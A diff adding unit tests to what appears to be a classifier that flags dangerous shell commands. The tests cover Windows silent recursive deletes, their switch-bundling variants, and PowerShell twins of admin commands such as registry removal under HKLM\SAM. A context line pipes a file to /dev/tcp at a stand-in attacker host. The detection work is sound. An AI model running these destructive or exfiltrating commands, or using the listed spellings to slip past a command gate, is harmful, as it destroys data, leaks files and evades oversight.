@@ -3926,3 +3926,189 @@ describe("POSIX: bash's own raw socket", () => {
 		expect(windows("cat C:\\x > /dev/tcp/evil.example/443")).toBeNull();
 	});
 });
+
+describe("Windows: `del /s /q` is `rd /s /q` under another name", () => {
+	/**
+	 * `del` was gated on `/f` alone and `rd` on `/s` **and** `/q`, so the silent
+	 * recursive spelling of the left-hand rule was not one of its inputs. Every row
+	 * here measured `null` before the batch — the `/f` in the fourth row is the only
+	 * reason that one matched, and it matched for the wrong reason.
+	 */
+	test.each([
+		["del /s /q C:\\x\\*", "the ordinary spelling"],
+		["erase /s /q C:\\x\\*", "under its other name"],
+		["DEL /S /Q C:\\x\\*", "in upper case"],
+		["del /s /q /f C:\\x\\*", "with the force flag as well"],
+		["del /q /s C:\\x\\*", "the flags the other way round"],
+		["cmd /c del /s /q C:\\x\\*", "after an explicit /c"],
+		["cmd /c echo hi && del /s /q C:\\x\\*", "chained, in the segment that does not say `cmd`"],
+		["rd /s /q C:\\x", "the rule that was already there"],
+		["rmdir /s /q C:\\x", "under its other name"],
+	])("%s is dangerous — %s", (command) => {
+		expect(windows(command)).not.toBeNull();
+	});
+
+	/**
+	 * Both switches are still required together. These are the spellings that make
+	 * the pair necessary, and `rd /s` alone is deliberately *not* a rule — it asks
+	 * before each directory, which is the difference the rule is named for.
+	 */
+	test.each([
+		["del /q C:\\build\\a.exe", "a quiet single delete"],
+		["del /s C:\\build\\a.exe", "a scoped delete that still asks"],
+		["rd /s C:\\x", "`rd` without `/q` asks for each directory"],
+		["del build\\a.exe", "an ordinary delete"],
+		["rd build", "removing a directory"],
+		["rmdir build /s", "removing a tree in the build directory"],
+	])("%s is not dangerous — %s", (command) => {
+		expect(windows(command)).toBeNull();
+	});
+
+	/**
+	 * The message names the act that destroys the most, so `del /s /q /f` reports the
+	 * recursion rather than the force.
+	 */
+	test("a delete that is both says so, and names the program that ran it", () => {
+		expect(windows("del /s /q /f C:\\x\\*")?.rule).toContain("silent recursive delete");
+		expect(windows("del /s /q /f C:\\x\\*")?.rule).not.toContain("forced delete");
+		expect(windows("erase /s /q C:\\x\\*")?.rule).toContain("erase");
+		expect(windows("del /f C:\\x\\*")?.rule).toBe("`del /f` (forced delete)");
+	});
+
+	/**
+	 * **Measured on `dir`, which owns both switches**, because this is the one place
+	 * in the batch where the obvious assumption and CMD disagree. `/s /q`, `/s/q`
+	 * and `/q/s` all list the file; `/z` answers `Invalid switch - "z"`. So CMD does
+	 * put several single-letter switches in one token, each behind its own slash,
+	 * and an exact token comparison missed it — `rd /s/q` was read as neither `/s`
+	 * nor `/q`.
+	 *
+	 * Letters bundled with **no** slash are not a spelling at all: `/sq` answers
+	 * `Invalid switch - "sq"`. These rows are the other direction of the same
+	 * measurement, and they are here because a reader who assumed the opposite would
+	 * add the bundled form and classify two commands that cannot run.
+	 */
+	test.each([
+		["rd /s/q C:\\x", "the two switches sharing a token"],
+		["rd /q/s C:\\x", "the other order"],
+		["del /q/s C:\\x\\*", "on `del`"],
+		["del /q/f C:\\x\\*", "the force flag sharing a token with the quiet one"],
+		["del /s;q /q C:\\x\\*", "the semicolon separator, which CMD accepts too"],
+		["rd /s;q /q C:\\x", "the same on `rd`"],
+	])("%s is dangerous — %s", (command) => {
+		expect(windows(command)).not.toBeNull();
+	});
+
+	test.each([
+		["rd /sq C:\\x", "CMD answers Invalid switch, so there is no such delete"],
+		["del /qs C:\\x\\*", "the same, the other way round"],
+		["del /sq C:\\x\\*", "and again"],
+	])("%s is not dangerous — %s", (command) => {
+		expect(windows(command)).toBeNull();
+	});
+
+	/**
+	 * The separators that are not separators.
+	 *
+	 * **Measured on real `del` against a file that existed:** `del /s:1 a.txt`
+	 * answers `参数格式不正确 - "s:1"` and `a.txt` is still there afterwards.
+	 * `/sq` is the same story in the other direction, and both are rows here rather
+	 * than an accident: classifying a command that cannot run is the wrong kind of
+	 * right. This file once read "the switch, then anything that is not a letter or
+	 * a digit", which matched `/s:1`, and its comment named that spelling as real.
+	 */
+	test.each([
+		["del /s:1 /q C:\\x\\*", "the colon CMD refuses"],
+		["rd /s:1 /q C:\\x", "and it is not a `del` quirk"],
+		["del /s.1 /q C:\\x\\*", "a full stop in the same place"],
+	])("%s is not dangerous — %s", (command) => {
+		expect(windows(command)).toBeNull();
+	});
+
+	/**
+	 * `;` is a CMD switch separator as well as the command separator this file splits
+	 * on, and which one you meant decides whether anything is deleted.
+	 *
+	 * **Measured on real `del` against a file that existed:** `del /s;q /q a.txt`
+	 * answers `已删除文件` and the file is gone — so the spelling is a live delete,
+	 * not a curiosity. The two halves reach the rules separately, and
+	 * {@link rejoinedSwitchSegments} is what puts them back together.
+	 */
+	test.each([
+		["del /s;q /q C:\\x\\*", "the quiet one after the separator"],
+		["rd /s;q /q C:\\x", "the same on `rd`"],
+		["del /q;s /q C:\\x\\*", "the other order"],
+	])("%s is dangerous — %s", (command) => {
+		expect(windows(command)).not.toBeNull();
+	});
+
+	/**
+	 * The join is only made where it is a switch bundle, and this is the half that
+	 * says it is not one. A PowerShell `;` separates two whole commands, and neither
+	 * of these is dangerous.
+	 */
+	test.each([
+		["powershell -c Get-ChildItem; Remove-Item C:\\x", "two ordinary commands"],
+		["cmd /c dir; del build\\a.txt", "a listing and a single delete"],
+		["powershell -c Write-Host a; Write-Host b", "two harmless writes"],
+	])("%s is not dangerous — %s", (command) => {
+		expect(windows(command)).toBeNull();
+	});
+
+	/**
+	 * The other half of the measurement, and the reason every piece in the token has
+	 * to be one character: a path must not be able to read as a switch. `/tmp/f`
+	 * contains the letter `f`, and `del /q /tmp/f` names a file in the current
+	 * directory rather than deleting a tree.
+	 */
+	test.each([
+		["del /q /tmp/f", "a path whose last segment is the force letter"],
+		["del /q /tmp/s", "and the recursive one"],
+		["rd /s /tmp/q", "a path carrying the quiet letter, with only `/s` written out"],
+		["del /q hello/world", "a path with a directory in it"],
+	])("%s is not dangerous — %s", (command) => {
+		expect(windows(command)).toBeNull();
+	});
+});
+
+describe("Windows: the PowerShell twins that were still missing", () => {
+	/**
+	 * `POWERSHELL_ADMIN_CMDLETS`'s own docstring says the gap class was closed once
+	 * already: the same act, spelled the way PowerShell spells it, was not
+	 * classified. Three of these are the twins of rules that were already matched —
+	 * `schtasks /run`, `icacls /grant` and `reg delete /f` — and all measured `null`.
+	 */
+	test.each([
+		["Start-ScheduledTask -TaskName x", "the twin of `schtasks /run`"],
+		["cmd /c Start-ScheduledTask -TaskName x", "after an explicit /c"],
+		["Set-Acl -Path C:\\x", "the twin of `icacls /grant`"],
+		["Remove-ItemProperty -Path HKLM:\\SAM -Name x", "the twin of `reg delete`"],
+		["Clear-ItemProperty -Path HKLM:\\SAM -Name x", "the same, clearing rather than removing"],
+		["powershell -Command Start-ScheduledTask -TaskName x", "through an explicit -Command"],
+	])("%s is dangerous — %s", (command) => {
+		expect(windows(command)).not.toBeNull();
+	});
+
+	/**
+	 * The read-only siblings, which is how this table decides membership. A rule that
+	 * flagged `Get-Acl` or `Get-ItemProperty` would fire on every diagnostic script
+	 * anyone has ever written.
+	 */
+	test.each([
+		["Get-Acl -Path C:\\x", "reading an ACL"],
+		["Get-ItemProperty -Path HKLM:\\SAM -Name x", "reading a registry value"],
+		["Get-ScheduledTask", "listing tasks"],
+		["Get-ScheduledTask -TaskName x", "reading one task"],
+	])("%s is not dangerous — %s", (command) => {
+		expect(windows(command)).toBeNull();
+	});
+
+	/** Each entry carries the reason it earns, so no message is borrowed from a twin. */
+	test("each twin names its own act rather than the CMD one", () => {
+		expect(windows("Start-ScheduledTask -TaskName x")?.rule).toContain("runs a registered task");
+		expect(windows("Set-Acl -Path C:\\x")?.rule).toContain("access control list");
+		expect(windows("Remove-ItemProperty -Path HKLM:\\SAM")?.rule).toContain("reg delete");
+		// The CMD twin keeps its own wording; the PS row must not have replaced it.
+		expect(windows("schtasks /run /tn x")?.rule).toBe("`schtasks /run`, which destroys machine state");
+	});
+});
